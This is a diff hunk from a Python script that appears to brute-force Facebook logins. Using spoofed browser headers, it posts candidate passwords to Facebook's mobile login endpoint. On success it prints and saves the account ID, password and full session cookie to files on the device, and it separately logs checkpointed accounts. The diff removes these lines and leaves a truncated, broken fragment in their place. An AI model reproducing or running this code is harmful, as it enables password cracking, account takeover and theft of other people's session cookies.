@@ -424,46 +424,4 @@ def rcrack(uid,pwx,tl):
     'dpr': '2.625',
     'origin': 'https://x.facebook.com',
     'referer': 'https://x.facebook.com/',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
-    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5836.202", "Google Chrome";v="114.0.5836.202"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '"SM-G975U"',
-    'sec-ch-ua-platform': '"macOS"',
-    'sec-ch-ua-platform-version': '""',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': pro,
-    'viewport-width': '412',
-    'x-asbd-id': '129477',
-    'x-fb-lsd': 'AVrqBrF5Idc',
-    'x-requested-with': 'XMLHttpRequest',
-    'x-response-format': 'JSONStream',}
-            lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[7:22]
-                print('    \033[1;32m(SAURABH-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
-                cek_apk(session,coki)
-                open('/sdcard/SAURABH-OK.txt', 'a').write( cid+' | '+ps+'\n')
-                oks.append(cid)
-                break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[24:39]
-                print('    \33[1;30m(SAURABH-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/SAURABH-CP.txt', 'a').write( cid+' | '+ps+' \n')
-                cps.append(cid)
-                break
-            else:
-                continue
-        loop+=1
-        sys.stdout.write('\r     %s[SAURABH] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
-        sys.stdout.flush()
-    except:
-        pass
- 
-ud()
- 
+    'sec-ch-prefers-color-scheme'
